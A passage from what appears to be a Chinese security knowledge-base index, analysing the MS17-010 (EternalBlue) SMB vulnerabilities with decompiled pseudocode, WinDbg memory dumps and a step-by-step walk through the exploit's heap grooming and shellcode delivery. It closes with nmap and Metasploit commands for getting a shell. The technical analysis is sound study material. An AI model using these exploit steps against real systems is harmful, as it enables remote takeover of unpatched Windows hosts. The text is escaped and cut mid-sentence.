\u6e90\u5730\u5740pOs2FeaBody\u7684\u5927\u5c0f\u4e3a\uff1a0x1ff75 // \u6b64\u65f6\u53d1\u751f\u4e86\u8d8a\u754c\u64cd\u4f5c if ( pOs2FeaBody gt ; v14 ) { v10 = v12 ; goto LABEL_13 ; } } * a4 = pOs2FeaBody - pOs2Fea ; v11 = 0xC000000D ; } SrvFreeNonPagedPool ( * pArgNtFea ); return v11 ; } if ( BYTE1 ( WPP_GLOBAL_Control - gt ; Flags ) gt ; = 2u amp ; amp ; WPP_GLOBAL_Control - gt ; Characteristics amp ; 1 amp ; amp ; KeGetCurrentIrql () lt ; 2u ) { _DbgPrint ( SrvOs2FeaListToNt: Unable to allocate %d bytes from nonpaged pool. , * a3 , 0 ); _DbgPrint ( \\n ); } return 0xC0000205 ; } \u52a8\u6001\u8c03\u8bd5\u4ee5\u4e0b\u6c47\u7f16\u4ee3\u7801\u53ef\u4ee5\u83b7\u53d6\u5230\u7528\u4e8e\u8fb9\u754c\u5224\u65ad\u7684\u5730\u5740\u8303c\u56f4\uff1a a6f7a5f1 f6067f test byte ptr [ esi ] , 7 Fh a6f7a5f4 753 c jne srv ! SrvOs2FeaListToNt + 0xcd ( a6f7a632 ) a6f7a5f6 56 push esi // \u8fd9\u91cc\u4e3a\u8d77\u59cb\u5730\u5740 a6f7a5f7 50 push eax a6f7a5f8 894508 mov dword ptr [ ebp+8 ] , eax a6f7a5fb 8975 fc mov dword ptr [ ebp-4 ] , esi a6f7a5fe e828fcffff call srv ! SrvOs2FeaToNt ( a6f7a22b ) a6f7a603 0 fb65601 movzx edx , byte ptr [ esi+1 ] a6f7a607 0 fb74e02 movzx ecx , word ptr [ esi+2 ] a6f7a60b 03 d6 add edx , esi a6f7a60d 8 d740a05 lea esi , [ edx+ecx+5 ] a6f7a611 3 bf3 cmp esi , ebx // \u83b7\u53d6ebx\u5373\u53ef\u5f97\u5230\u8fb9\u754c\u5730\u5740 # \u65ad\u70b9 bp srv ! SrvOs2FeaListToNt + 0x91 \u83b7\u53d6\u8d77\u59cb\u5730\u5740 bp srv ! SrvOs2FeaListToNt + 0xac \u83b7\u53d6\u8fb9\u754c\u5730\u5740 \u901a\u8fc7\u8fb9\u754c\u5730\u5740-\u8d77\u59cb\u5730\u5740\u53ef\u4ee5\u5f97\u5230\u5177\u4f53\u7684\u5927\u5c0f srv ! SrvOs2FeaListToNt + 0 x91 : a6f7a5f6 56 push esi kd gt ; r eax = 865 a5008 ebx = 8 ef72051 ecx = 0001 ff7e edx = 00000000 esi = 8 ef520dc edi = 8 ef520d8 eip = a6f7a5f6 esp = 8 ba67b6c ebp = 8 ba67b7c iopl = 0 nv up ei pl zr na pe nc cs = 0008 ss = 0010 ds = 0023 es = 0023 fs = 0030 gs = 0000 efl = 00000246 srv ! SrvOs2FeaListToNt + 0 x91 : a6f7a5f6 56 push esi srv ! SrvOs2FeaListToNt + 0 xac : a6f7a611 3 bf3 cmp esi , ebx kd gt ; r eax = 865 a5014 ebx = 8 ef72051 ecx = 00000000 edx = 8 ef520dc esi = 8 ef520e1 edi = 8 ef520d8 eip = a6f7a611 esp = 8 ba67b6c ebp = 8 ba67b7c iopl = 0 nv up ei ng nz na po nc cs = 0008 ss = 0010 ds = 0023 es = 0023 fs = 0030 gs = 0000 efl = 00000282 srv ! SrvOs2FeaListToNt + 0 xac : a6f7a611 3 bf3 cmp esi , ebx ebx - esi = 0 x8ef72051 - 0 x8ef520dc = 0 x1ff75 \u5728\u524d\u9762SrvOs2FeaListSizeToNt\u83b7\u53d6\u7684\u5927\u5c0f\u4e5f\u5c31\u662f\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e3a\uff1a0x10fe8\uff0c\u800c\u4f7f\u7528\u7684\u8fb9\u754c\u5927\u5c0f\u4e3a\uff1a0x1ff75(\u8fd9\u91cc\u4e3a\u4ec0\u4e48\u4e0esize\u6709\u51fa\u5165\u662f\u56e0\u4e3a\u8d77\u59cb\u5730\u5740\u79fb\u52a8\u4e864\u5b57\u8282\uff0c\u540c\u65f6\u8fb9\u754c\u5927\u5c0f\u4e5f\u51cf\u5c0f\u4e865\u5b57\u8282) \u4e3a\u4e86\u67e5\u770b\u6ea2\u51fa\u8986\u76d6\u7684\u5177\u4f53\u7ec6\u8282\uff0c\u9700\u8981\u5b9a\u4f4d\u5230\u6267\u884c\u6700\u540e\u4e00\u6b21memmove\u7684\u64cd\u4f5c\uff1a \u901a\u8fc7while\u5faa\u73af\u8df3\u51fa\uff0c\u5728\u8df3\u51fa\u4f4d\u7f6e\u4e0b\u65ad\u70b9\uff0c\u8ba1\u7b97\u5faa\u73af\u4e86\u591a\u5c11\u6b21 \u76f4\u63a5\u901a\u8fc7memmove\u8bbe\u7f6e\u6761\u4ef6\u65ad\u70b9(\u901a\u8fc7payload\u77e5\u9053\u5927\u90e8\u5206\u7684\u64cd\u4f5c\u590d\u5236\u5b57\u8282\u6570\u90fd\u4e3a0) SrvOs2FeaToNt\u4f2a\u4ee3\u7801\uff1a unsigned int __fastcall SrvOs2FeaToNt ( int a1 , int a2 ) { int v4 ; // edi@1 _BYTE * v5 ; // edi@1 unsigned int result ; // eax@1 v4 = a1 + 8 ; * ( _BYTE * )( a1 + 4 ) = * ( _BYTE * ) a2 ; * ( _BYTE * )( a1 + 5 ) = * ( _BYTE * )( a2 + 1 ); * ( _WORD * )( a1 + 6 ) = * ( _WORD * )( a2 + 2 ); _memmove (( void * )( a1 + 8 ), ( const void * )( a2 + 4 ), * ( _BYTE * )( a2 + 1 )); v5 = ( _BYTE * )( * ( _BYTE * )( a1 + 5 ) + v4 ); * v5 ++ = 0 ; _memmove ( v5 , ( const void * )( a2 + 5 + * ( _BYTE * )( a1 + 5 )), * ( _WORD * )( a1 + 6 )); //\u8fd9\u91cc\u4ea7\u751f\u7684\u8d8a\u754c\u8986\u76d6 result = ( unsigned int ) amp ; v5 [ * ( _WORD * )( a1 + 6 ) + 3 ] amp ; 0xFFFFFFFC ; * ( _DWORD * ) a1 = result - a1 ; return result ; } \u7b2c\u4e00\u79cd\uff1a\u5224\u5b9awhile\u5faa\u73af\u6267\u884c\u4e86\u591a\u5c11\u6b21c # \u8fd9\u91cc\u901a\u8fc7\u4e34\u65f6\u5bc4\u5b58\u5668\u6765\u8ba1\u6570 r $ t0 = 0 # a6f7a5f4 753 c jne srv ! SrvOs2FeaListToNt + 0xcd ( a6f7a632 ) bp srv ! SrvOs2FeaListToNt + 0x8f .if (@zf=0) {} .else {gc} # a6f7a5f6 56 push esi // \u8fd9\u91cc\u4e3a\u8d77\u59cb\u5730\u5740 bp srv ! SrvOs2FeaListToNt + 0x91 r $t0=@$t0+1;g; # \u67e5\u770b\u8ba1\u6570 kd gt ; r $ t0 $ t0 = 0000025 b \u7b2c\u4e8c\u79cd\uff1a\u901a\u8fc7srv!SrvOs2FeaToNt\u4e2d\u7684memmove\u4e0b\u65ad\u8fdb\u884c\u5b9a\u4f4d bp srv!SrvOs2FeaToNt+0x4d .if (poi(esp+8) != 0) {gc} .else {} \u8fd9\u91cc\u662f\u56e0\u4e3apayload\u77e5\u9053\u4e86memmove\u524d\u9762\u90fd\u662f\u8fdb\u884c0\u5b57\u8282\u7684copy\u3002 kd gt ; dd esp 94 b1bb38 86 adec31 a2e86c99 0000 f3bd 86 adec30 kd gt ; dd esp 94 b1bb38 86 aedff9 a2e9605b 0000008 f 86 aedff8 // \u6700\u540e\u4e00\u6b21\u7684\u5927\u5c0f\u4e3a 0 x8f \u901a\u8fc7\u4e0a\u9762\u53ef\u4ee5\u77e5\u9053\uff0c\u76ee\u6807\u5730\u5740\u4e3a\uff1a86aedff9\uff0c\u590d\u5236\u7684\u5b57\u8282\u6570\u4e3a\uff1a0x8f\uff1b \u63a5\u7740\u67e5\u770bpool\u4fe1\u606f\uff1a kd gt ; ! pool 86 aedff9 Pool page 86 aedff9 region is Nonpaged pool * 86 add000 : large page allocation , Tag is LSdb , size is 0 x11000 bytes Pooltag LSdb : data buffer kd gt ; ? 86 aedff9 + 8 f Evaluate expression : - 2035359608 = 86 aee088 // \u8d8a\u754c\u540e\u7ed3\u675f\u5730\u5740 kd gt ; ! pool 86 aee088 Pool page 86 aee088 region is Nonpaged pool 86 aee000 size : 8 previous size : 0 ( Free ) .... * 86 aee000 : large page allocation , Tag is LSbf , size is 0 x11000 bytes Pooltag LSbf : buffer descriptor \u53d1\u751f\u4e86\u8d8a\u754c\u8986\u76d6 \u67e5\u770b\u8986\u76d6\u524d\u7684\u5185\u5b58\u4fe1\u606f\uff1a kd gt; db 86aee000 86aee000+88 86aee000 00 10 01 00 00 00 00 00-ff ff 00 00 00 00 00 00 ................ 86aee010 ff ff 00 00 c0 f0 df ff-c0 f0 df ff 00 00 00 00 ................ 86aee020 00 00 00 00 64 0b 00 00-00 f1 df ff 00 00 00 00 ....d........... 86aee030 00 00 00 00 10 e0 ae 86-00 f1 df ff 00 00 00 00 ................ 86aee040 60 00 04 10 00 00 00 00-80 ef df ff 00 00 00 00 `............... 86aee050 10 00 d0 ff ff ff ff ff-10 01 d0 ff ff ff ff ff ................ 86aee060 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 86aee070 60 00 04 10 00 00 00 00-00 00 00 00 00 00 00 00 `............... 86aee080 90 ff cf ff ff ff ff ff-fa \u67e5\u770b\u8986\u76d6\u540e\u7684\u5185\u5b58\u4fe1\u606f\uff1a kd gt; db 86aee000 86aee000+88 86aee000 00 10 01 00 00 00 00 00-ff ff 00 00 00 00 00 00 ................ 86aee010 ff ff 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 86aee020 00 00 00 00 00 00 00 00-00 f1 df ff 00 00 00 00 ................ 86aee030 00 00 00 00 20 f0 df ff-00 f1 df ff 00 00 00 00 .... ........... 86aee040 60 00 04 10 00 00 00 00-80 ef df ff 00 00 00 00 `............... 86aee050 10 00 d0 ff ff ff ff ff-10 01 d0 ff ff ff ff ff ................ 86aee060 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 86aee070 60 00 04 10 00 00 00 00-00 00 00 00 00 00 00 00 `............... 86aee080 90 ff cf ff ff ff ff ff-fa \u7b2c\u4e8c\u4e2a\uff1a\u53d1\u9001SMB_COM_NT_TRANSACT\u5e76\u9644\u5e26FEA LIST\u548c\u591a\u4e2atranscation\uff0c\u670d\u52a1\u7aef\u4f1a\u901a\u8fc7 SMB_COM_TRANSACTION2_SECONDARY\u5c06SMB_COM_NT_TRANSACT\u4f5c\u4e3aSMB_COM_TRANSACTION2\u5904\u7406\uff1b\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u4f20\u5165FEA LIST\u5927\u4e8e0xffff\u5927\u5c0f\u7684\u6570\u636e\uff0c\u56e0\u4e3aSMB_COM_NT_TRANSACT\u957f\u5ea6\u5b57\u6bb5\u7c7b\u578b\u4e3aULONG\uff0c\u800cSMB_COM_TRANSACTION2\u4e3aUSHORT\u7c7b\u578b \u6838\u5fc3\u95ee\u9898\uff1a\u5bf9\u4e8e transaction\u7c7b\u578b\u7684\u6821\u9a8c\uff0c\u53ea\u662f\u4ee5\u6700\u540e\u63a5\u6536\u7684*_SECONDARY\u7c7b\u578b\u4e3a\u51c6\uff0c\u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7SMB_COM_NT_TRANSACT\u4f20\u9012payload\uff0c\u5e76\u4ee5SMB_COM_TRANSACTION2_SECONDARY\u7ed3\u5c3e\uff0c\u8fd9\u6837\u5c31\u9020\u6210\u4e86\u9519\u8bef\u89e3\u6790\uff0c\u5c06SMB_COM_NT_TRANSACT\u4ee5SMB_COM_TRANSACTION2\u7c7b\u578b\u8fdb\u884c\u89e3\u6790 SMB Message Structure # The SMB_Header structure is a fixed 32 - bytes in length . SMB_Header { UCHAR Protocol [ 4 ] ; UCHAR Command ; SMB_ERROR Status ; UCHAR Flags ; USHORT Flags2 ; USHORT PIDHigh ; UCHAR SecurityFeatures [ 8 ] ; USHORT Reserved ; USHORT TID ; USHORT PIDLow ; USHORT UID ; USHORT MID ; } # SMB_Parameters { UCHAR WordCount ; USHORT Words [ WordCount ] ( variable ); } # SMB_Data { USHORT ByteCount ; UCHAR Bytes [ ByteCount ] ( variable ); } \u901a\u8fc7PID\u3001MID\u3001TID\u3001UID\u6765\u5339\u914d\u662f\u5426\u76f8\u540c\uff0c\u4f1a\u5728\u670d\u52a1\u7aef\u5c06\u5176\u7ec4\u88c5\u4e3a\u540c\u4e00\u7c7b\u578btrancation \u7b2c\u4e09\u4e2a\uff1a\u5728\u5904\u7406 SMB_COM_SESSION_SETUP_ANDX \u547d\u4ee4\u65f6\uff0c\u4f1a\u4ee513\u7c7b\u578b\u7684\u8bf7\u6c42\u65b9\u5f0f\u5904\u740612\u8bf7\u6c42\u7684\u6570\u636e\uff1b\u8fd9\u6837\u65e2\u53ef\u4ee5\u7a33\u5b9a\u63a7\u5236\u8fde\u7eedpool\u5185\u5b58\u7684\u7533\u8bf7\u548c\u91ca\u653e SMB_COM_TREE_CONNECT_ANDX SMB_COM_SESSION_SETUP_ANDX # SMB_COM_SESSION_SETUP_ANDX # LM and NTLM authentication # NT Security request SMB_Parameters { UCHAR WordCount ; // 0xD = 13 Words { UCHAR AndXCommand ; UCHAR AndXReserved ; USHORT AndXOffset ; USHORT MaxBufferSize ; USHORT MaxMpxCount ; USHORT VcNumber ; ULONG SessionKey ; USHORT OEMPasswordLen ; USHORT UnicodePasswordLen ; ULONG Reserved ; ULONG Capabilities ; } } SMB_Data { USHORT ByteCount ; Bytes { UCHAR OEMPassword [] ; UCHAR UnicodePassword [] ; UCHAR Pad [] ; SMB_STRING AccountName [] ; SMB_STRING PrimaryDomain [] ; SMB_STRING NativeOS [] ; SMB_STRING NativeLanMan [] ; } } # extended security request SMB_Parameters { UCHAR WordCount ; // 0xC = 12 Words { UCHAR AndXCommand ; UCHAR AndXReserved ; USHORT AndXOffset ; USHORT MaxBufferSize ; USHORT MaxMpxCount ; USHORT VcNumber ; ULONG SessionKey ; USHORT SecurityBlobLength ; ULONG Reserved ; ULONG Capabilities ; } } SMB_Data { USHORT ByteCount ; Bytes { UCHAR SecurityBlob [ SecurityBlobLength ] ; SMB_STRING NativeOS [] ; SMB_STRING NativeLanMan [] ; } } \u6f0f\u6d1e\u51fd\u6570BlockingSessionSetupAndX\u4f2a\u4ee3\u7801\u5982\u4e0b\uff1a BlockingSessionSetupAndX(request, smbHeader) { // check word count if (! (request- gt;WordCount == 13 || (request- gt;WordCount == 12 amp; amp; (request- gt;Capablilities amp; CAP_EXTENDED_SECURITY))) ) { // error and return } // ... if ((request- gt;Capablilities amp; CAP_EXTENDED_SECURITY) amp; amp; (smbHeader- gt;Flags2 amp; FLAGS2_EXTENDED_SECURITY)) { // this request is Extend Security request GetExtendSecurityParameters(request); // extract parameters and data to variables SrvValidateSecurityBuffer(request); // do authentication } else { // this request is NT Security request GetNtSecurityParameters(request); // extract parameters and data to variables SrvValidateUser(request); // do authentication } // ... } \u53d1\u9001Extended Security request(12)\u9644\u5e26CAP_EXTENDED_SECURITY\uff0c\u5e76\u672a\u9644\u5e26FLAG2_EXTENDED_SECURITY\uff0c\u5c06\u8be5\u8bf7\u6c42\u4f2a\u88c5\u6210\u4e3aSMB_COM_SESSION_SETUP_ANDX(13) \u8fd9\u6837\u5c31\u4f1a\u5c06\u8bf7\u6c42\u4ee5NT Security request(13)\u8fdb\u884c\u5904\u7406\uff0c\u8fdb\u5165\u51fd\u6570GetNtSecurityParameters,\u5728\u8be5\u51fd\u6570\u4e2d\u4f1a\u901a\u8fc7wordcount\u548cbytecount\u8ba1\u7b97\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\uff0c\u4f4612\u7c7b\u578b\u548c13\u7c7b\u578b\u4e2d\u7684bytecount\u504f\u79fb\u4e0d\u540c\uff0c\u56e0\u6b64\u5f5312\u7c7b\u578b\u88ab\u4f5c\u4e3a13\u7c7b\u578b\u89e3\u6790\u65f6\uff0c\u4f1a\u89e3\u6790\u5230SecurityBlob\u4f5c\u4e3abytecount\u5927\u5c0f \u8fd9\u91cc\u7684\u4e3b\u8981\u95ee\u9898\u662f\uff1a\u5f53\u8bbe\u5b9aFLAGS2_EXTENDED_SECURITY\u548cCAP_EXTENDED_SECURITY\uff0c\u5219\u5c06\u8bf7\u6c42\u6309\u7167Extended Security request(12)\u5904\u7406\uff0c\u5426\u5219\u6309\u7167NT Security request(13)\u8fdb\u884c\u5904\u7406\u3002 \u5728payload\u4e2d\u7684\u5229\u7528\uff1a sessionSetup[ Parameters ] = smb.SMBSessionSetupAndX_Extended_Parameters() sessionSetup[ Data ] = pack( lt;H , reqSize) + \\x00 *20 // \u8fd9\u91cc\u6700\u7ec8\u89e3\u679012\u7c7b\u578b\u4e2dSMB_Data.Bytes\u7684\u5934\u4e24\u4e2a\u5b57\u8282\u4e3a\u89e3\u6790\u7684\u5927\u5c0f(\u572813\u7c7b\u578b\u4e2d\u7684ByteCount) \u8fd9\u91cc\u7684sessionSetup[\\'Data\\']\u5373\u4e3aSMB_Data.Bytes,\u56e0\u6b64\u5934\u4e24\u4e2a\u5b57\u8282\u5c31\u662freqSize \u81f3\u6b64\u4e09\u4e2a\u6f0f\u6d1e\u641e\u660e\u767d\u540e\uff0c\u4f46\u5bf9\u4e8e\u6574\u4e2a\u6f0f\u6d1e\u94fe\u662f\u5982\u4f55\u4e32\u8d77\u6765\u7684\u8fd8\u662f\u6bd4\u8f83\u6a21\u7cca\uff0c\u4f8b\u5982\uff1a \u5982\u4f55\u5229\u7528\u6f0f\u6d1e1\u7684\u8d8a\u754c\u6765\u89e6\u53d1\u547d\u4ee4\u6267\u884c \u5982\u4f55\u5229\u7528\u6f0f\u6d1e2\u4f20\u5165FEA LIST\uff0c\u4e5f\u5c31\u662f\u53ef\u63a7\u7684\u6570\u636e\u7528\u6765\u89e6\u53d1\u6f0f\u6d1e1 \u6f0f\u6d1e3\u53ea\u662f\u8fdb\u884c\u4e86Non-Paged pool\u7533\u8bf7\uff0c\u5b9e\u73b0\u4e86\u5360\u5751\u4f46\u6ca1\u6709\u8fdb\u884c\u91ca\u653e\uff0c\u5185\u90e8\u5e03\u5c40\u5982\u4f55\u6784\u9020 0x02 \u8d8a\u754c\u5982\u4f55\u89e6\u53d1\u547d\u4ee4\u6267\u884c \u4e3a\u4e86\u89e6\u53d1\u547d\u4ee4\u6267\u884c\uff0c\u8fd9\u91cc\u5f15\u51fa\u5173\u952e\u6570\u636e\u7ed3\u6784srvnet\uff0c\u5176\u4e2d\u67092\u4e2a\u5173\u952e\u5b57\u6bb5\uff1a MDL(pMDl1): memory descriptor list;\u5c06I/O\u6570\u636e\u5199\u5165\u5230\u6307\u5b9a\u7684MDL\u6307\u5b9a\u865a\u62df\u5730\u5740\u4e2d\uff0c\u5728\u5b9e\u9645\u5229\u7528\u4e2dclient\u53d1\u9001\u7684\u6570\u636e\u4f1a\u5199\u5165\u5230\u6307\u5b9a\u7684\u865a\u62df\u5730\u5740\u4e2d\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4f20\u5165\u53ef\u63a7\u7684\u6570\u636e\u5230\u6307\u5b9a\u7684\u5730\u5740 pSrvNetWskStruct: \u6307\u5411SrvNetWskStruct\u7ed3\u6784\u4f53\uff0c\u8be5\u7ed3\u6784\u4f53\u4e2d\u5b58\u5728\u4e00\u4e2a\u51fd\u6570\u6307\u9488HandlerFunction\uff0c\u8be5\u51fd\u6570\u4f1a\u5728srvnet\u8fde\u63a5\u4e2d\u65ad\u65f6\u8fdb\u884c\u8c03\u7528\uff1b\u90a3\u4e48\u5982\u679cpSrvNetWskStruct\u6307\u5411\u7684\u7ed3\u6784\u4f53\u662f\u4f2a\u9020\u7684\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5f88\u987a\u5229\u7684\u89e6\u53d1\u547d\u4ee4\u6267\u884c \u8fd9\u91cc\u5229\u7528\u7684\u5730\u5740\u4e3aHAL\u7684heap\u7684\u56fa\u5b9a\u5730\u5740\uff0c\u56e0\u4e3a\u5728\u8be5\u6bb5\u5730\u5740\u662f\u53ef\u6267\u884c\u7684 0xffd00000 # 32\u4f4d 0xffffffff ffd00000 # 64\u4f4d \u53ea\u8981\u80fd\u901a\u8fc7\u8d8a\u754c\u63a7\u5236\u8fd9\u4e24\u4e2a\u5b57\u6bb5\u5c31\u53ef\u4ee5\u4e86\uff0c\u4f46\u5982\u4f55\u5c06srv buff\u548csrvnet buff\u62fc\u63a5\u5230\u4e00\u8d77\uff1f 0x03 \u5982\u4f55\u901a\u8fc7\u8bf7\u6c42\u89e6\u53d1\u6f0f\u6d1e \u8fd9\u91cc\u7ed3\u5408exp\uff0c\u6765\u770b\u6574\u4e2a\u8bf7\u6c42\u6d41\u7a0b\u662f\u5982\u4f55\u8fdb\u884c\u7684\uff1a srv\u5206\u914d\uff1aSMBv1\u6570\u636e\u5305\u53ef\u4ee5\u89e6\u53d1srv\u7684\u5185\u5b58\u7533\u8bf7\uff0c\u7c7b\u578b\u4e3apaged\u6216\u8005non-paged pool srvnet\u5206\u914d\uff1a SMBv2\u6570\u636e\u5305\u53ef\u4ee5\u89e6\u53d1srvnet\u7684\u5185\u5b58\u7533\u8bf7\uff0c\u7c7b\u578b\u4e3apaged\u6216\u8005non-paged pool \u4e00\u3001\u53d1\u9001fealist\u5206\u914dsrv\uff1a send_big_trans2(conn, tid, 0, feaList, \\x00 *30, 2000, False) \u8fd9\u91cc\u5229\u7528\u4e86\u6f0f\u6d1e2\u5e76\u4e14\u4fdd\u7559\u6700\u540e\u7684fragment\u4e0d\u53d1\u9001\uff0c\u5176\u4e2dfealist\u7684\u5185\u5bb9\u5982\u4e0b\uff1a NTFEA_SIZE = 0x11000 ntfea11000 = ( pack ( lt;BBH , 0 , 0 , 0 ) + \\x00 ) * 600 # \u8fd9\u91cc\u5bf9\u5e94\u7684ntfea size\u662f0x1c20 \uff0c \u56e0\u4e3a\u6bcf\u4e00\u6761fea\u8bb0\u5f55\u8f6c\u5316\u4e3aNTfea\u65f6\u90fd\u4f1a\u589e\u52a05\u4e2a\u5b57\u8282 ntfea11000 += pack ( lt;BBH , 0 , 0 , 0xf3bd ) + A * 0xf3be # 0x10fe8 - 0x1c20 - 0xc = 0xf3bc ntfea = { 0x10000 : ntfea10000 , 0x11000 : ntfea11000 } feaList = pack ( lt;I , 0x10000 ) feaList += ntfea [ NTFEA_SIZE ] feaList += pack ( lt;BBH , 0 , 0 , len ( fakeSrvNetBuffer ) - 1 ) + fakeSrvNetBuffer # \u9700\u8981\u8d8a\u754c\u8986\u76d6\u7684\u4e1c\u897f feaList += pack ( lt;BBH , 0x12 , 0x34 , 0x5678 ) # \u65e0\u6548\u7684\u8bb0\u5f55 \uff0c \u4f1a\u89e6\u53d1\u8f6c\u6362\u5f02\u5e38 \u8fd9\u91cc\u5bf9\u5e94\u7684fealist\u7684\u7ed3\u6784\u4f53\u5982\u4e0b\uff1a typedef struct _FEA { /* fea */ BYTE fEA ; /* flags*/ BYTE cbName ; /* name length not including NULL */ USHORT cbValue ; /* value length */ } FEA , * PFEA ; typedef struct _FEALIST { /* fealist */ DWORD cbList ; /* total bytes of structure including full list */ FEA list [ 1 ]; /* variable length FEA structures */ } FEALIST , * PFEALIST ; \u4e8c\u3001\u5229\u7528bug3\u7533\u8bf7\u5927\u5c0f\u4e3a\uff1a NTFEA_SIZE-0x1010 \u7684non-paged pool\u5185\u5b58 allocConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x1010) \u8fd9\u5757\u5185\u5b58\u7684\u7533\u8bf7\u662f\u4e3a\u4e86\u786e\u4fdd\u540e\u7eedNTFEA\u7684\u5185\u5b58\u53ef\u4ee5\u4e0esrvnet\u76f8\u90bb \u4e09\u3001\u7533\u8bf7\u591a\u4e2asrvnet\u8fdb\u884c\u5360\u5751\uff1a srvnetConn = [] for i in range(numGroomConn): sk = createConnectionWithBigSMBFirst80(target) srvnetConn.append(sk) \u56db\u3001\u5229\u7528bug3\u7533\u8bf7\u5927\u5c0f\u4e3a\uff1a NTFEA_SIZE-0x10 \u7684non-paged pool\u5185\u5b58 holeConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x10) \u8fd9\u5757\u5185\u5b58\u662f\u7528\u6765\u786e\u4fddNTFEA\u4f7f\u7528\uff0c\u63a5\u7740\u8ba9srvnet\u4e0e\u8fd9\u5757\u5185\u5b58\u76f8\u90bb\u5373\u53ef \u4e94\u3001\u91ca\u653e\u7b2c\u4e8c\u6b65\u7533\u8bf7\u7684\u5185\u5b58\uff0c\u8fd9\u6837\u53ef\u4ee5\u786e\u4fdd\u4e34\u65f6\u7533\u8bf7\u7684\u4e00\u4e9b\u5c0f\u5185\u5b58\u4e0d\u4f1a\u76f4\u63a5\u6dfb\u52a0\u5230holeConn\u540e\u9762\uff0c\u963b\u788dsrvnet\u7684\u5360\u7528 allocConn.get_socket().close() \u516d\u3001\u7533\u8bf7srvnet\uff0c\u4ec5\u9760holeConn\uff1a for i in range(5): sk = createConnectionWithBigSMBFirst80(target) srvnetConn.append(sk) \u8fd9\u91cc\u7533\u8bf7\u591a\u4e2a\uff0c\u53ea\u6709\u4e00\u4e2a\u53ef\u4ee5\u4ec5\u9760holeConn\uff0c\u90a3\u4e48\u5c31\u7b97\u662f\u6210\u529f\u4e86 \u4e03\u3001\u6b64\u65f6\u5185\u5b58\u5e03\u5c40\u57fa\u672c\u5b8c\u6210\uff0c\u91ca\u653eholeConn\uff0c\u51c6\u5907\u89e6\u53d1\u6574\u4e2a\u6f0f\u6d1e\u94fe holeConn.get_socket().close() \u516b\u3001\u53d1\u9001fealist\u6700\u540e\u4e00\u4e2afragment\uff0c\u6b64\u65f6\u4f1a\u89e6\u53d1bug1\u7684\u8d8a\u754c\u64cd\u4f5c send_trans2_second(conn, tid, feaList[progress:], progress) \u8fd9\u91cc\u901a\u8fc7\u54cd\u5e94\u6765\u5224\u65ad\u662f\u5426\u53d1\u751f\u8d8a\u754c\uff0c\u56e0\u4e3a\u6784\u9020\u7684fealist\u6700\u540e\u4e00\u6761\u8bb0\u5f55\u662f\u975e\u6cd5\u8bb0\u5f55\uff0c\u8f6c\u6362\u80af\u5b9a\u4f1a\u62a5\u9519\uff1a recvPkt = conn.recvSMB() retStatus = recvPkt.getNTStatus() # retStatus MUST be 0xc000000d (INVALID_PARAMETER) because of invalid fea flag if retStatus == 0xc000000d: print( good response status: INVALID_PARAMETER ) else: print( bad response status: 0x{:08x} .format(retStatus)) \u4e5d\u3001\u5b8c\u6210\u4e86\u8d8a\u754c\u540e\uff0c\u501f\u52a9srvnet\u8986\u76d6\u540e\u7684MDL\uff0c\u5411HAL\\'s heap\u5730\u5740\u4f20\u5165shellcode for sk in srvnetConn: sk.send(fake_recv_struct + shellcode) \u5341\u3001\u6700\u540e\u65ad\u5f00\u94fe\u63a5\u89e6\u53d1\u547d\u4ee4\u6267\u884c\uff1a for sk in srvnetConn: sk.close() \u6f0f\u6d1e\u590d\u73b0 \u4f7f\u7528nmap\u63a2\u6d4b\u7cfb\u7edf\u7248\u672c\uff0c\u4ee5\u53ca\u662f\u5426\u5b58\u5728\u6f0f\u6d1e\u3002 nmap -O -p 445 --script=smb-vuln-ms17-010.nse 192.168.75.133 \u4f7f\u7528msf \u8fdb\u5165ms17-010\u7684\u5229\u7528\u6a21\u5757\u3002 xp\u7cfb\u7edf\u7684\u5229\u7528\u6a21\u5757\u4e3a exploit/windows/smb/ms17_010_psexec win7\uff0cserver 2008 \u5229\u7528\u6a21\u5757\u4e3a**exploit/windows/smb/ms17_010_eternalblue** win8\uff0cserver 2012\u6ca1\u6d4b\u8bd5\u3002 \u6d4b\u8bd5\u73af\u5883\u7cfb\u7edf\u4e3axp\u7cfb\u7edf\u3001\u8fdb\u5165\u5229\u7528\u6a21\u5757 set rhost \u8bbe\u7f6e\u76ee\u6807ip\u3001run \u6210\u529fgetshell","title":"\uff08CVE 2017 0143........\uff09\u3010MS17 010\u3011Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2017-0143........\uff09\u3010MS17-010\u3011Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#cve-2017-0143cve-2017-0144cve-2017-0145cve-2017-0146cve-2017-0147cve-2017-0148ms17-010windows","text":"","title":"\uff08CVE-2017-0143\uff0cCVE-2017-0144\uff0cCVE-2017-0145\uff0cCVE-2017-0146\uff0cCVE-2017-0147\uff0cCVE-2017-0148\uff09\u3010MS17-010\u3011Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2017-0143........\uff09\u3010MS17-010\u3011Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#_1","text":"\u200b MS17-010\uff08\u6c38\u6052\u4e4b\u84dd\uff09\u5e94\u7528\u7684\u4e0d\u4ec5\u4ec5\u662f\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u800c\u662f\u5305\u542bWindows SMB 